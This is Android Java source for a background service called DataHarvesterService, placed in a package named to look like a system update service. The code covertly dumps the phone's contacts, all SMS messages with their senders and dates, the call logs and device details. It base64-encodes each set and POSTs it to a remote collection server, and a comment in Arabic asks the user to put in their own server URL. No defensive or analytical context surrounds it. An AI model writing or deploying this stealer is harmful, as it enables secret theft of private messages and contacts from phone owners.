herepackage com.system.updateservice;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.CallLog;
import android.util.Log;
import java.io.BufferedWriter;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class DataHarvesterService extends Service {
    
    // غير هذا الرابط إلى رابط السيرفر الحقيقي الخاص بك
    private static final String SERVER_URL = "https://your-actual-server.herokuapp.com/collect_data.php";
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // بدء جمع البيانات في خلفية منفصلة
        new Thread(new Runnable() {
            @Override
            public void run() {
                harvestAllData();
            }
        }).start();
        
        return START_STICKY;
    }
    
    private void harvestAllData() {
        harvestContacts();
        harvestSMS();
        harvestCallLogs();
        harvestDeviceInfo();
    }
    
    private void harvestContacts() {
        try {
            Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            );
            
            StringBuilder contactsData = new StringBuilder();
            contactsData.append("=== CONTACTS DUMP ===\n");
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(
                        cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                    );
                    contactsData.append("Contact: ").append(name).append("\n");
                }
                cursor.close();
            }
            sendToServer("contacts", contactsData.toString());
        } catch (Exception e) {
            Log.e("DataHarvester", "Error in contacts: " + e.getMessage());
        }
    }
    
    private void harvestSMS() {
        try {
            Cursor cursor = getContentResolver().query(
                Uri.parse("content://sms"),
                null, null, null, null
            );
            
            StringBuilder smsData = new StringBuilder();
            smsData.append("=== SMS DUMP ===\n");
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    String date = cursor.getString(cursor.getColumnIndex("date"));
                    smsData.append("From: ").append(address)
                           .append(" | Message: ").append(body)
                           .append(" | Date: ").append(date).append("\n");
                }
                cursor.close();
            }
            sendToServer("sms", smsData.toString());
        } catch (Exception e) {
            Log.e("DataHarvester", "Error in SMS: " + e.getMessage());
        }
    }
    
    private void harvestCallLogs() {
        try {
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null, null
            );
            
            StringBuilder callData = new StringBuilder();
            callData.append("=== CALL LOGS ===\n");
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    callData.append("Number: ").append(number)
                            .append(" | Duration: ").append(duration)
                            .append("s | Type: ").append(type).append("\n");
                }
                cursor.close();
            }
            sendToServer("call_logs", callData.toString());
        } catch (Exception e) {
            Log.e("DataHarvester", "Error in call logs: " + e.getMessage());
        }
    }
    
    private void harvestDeviceInfo() {
        try {
            StringBuilder deviceInfo = new StringBuilder();
            deviceInfo.append("=== DEVICE INFO ===\n");
            deviceInfo.append("Time: ").append(new Date().toString()).append("\n");
            deviceInfo.append("Manufacturer: ").append(android.os.Build.MANUFACTURER).append("\n");
            deviceInfo.append("Model: ").append(android.os.Build.MODEL).append("\n");
            deviceInfo.append("Android Version: ").append(android.os.Build.VERSION.RELEASE).append("\n");
            
            sendToServer("device_info", deviceInfo.toString());
        } catch (Exception e) {
            Log.e("DataHarvester", "Error in device info: " + e.getMessage());
        }
    }
    
    private void sendToServer(String dataType, String data) {
        try {
            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            
            String postData = "type=" + dataType + "&data=" + 
                android.util.Base64.encodeToString(data.getBytes("UTF-8"), android.util.Base64.DEFAULT);
            
            OutputStream os = conn.getOutputStream();
            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
            writer.write(postData);
            writer.flush();
            writer.close();
            os.close();
            
            int responseCode = conn.getResponseCode();
            Log.d("DataHarvester", "Data sent successfully: " + responseCode);
            
        } catch (Exception e) {
            Log.e("DataHarvester", "Error sending data: " + e.getMessage());
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
          }
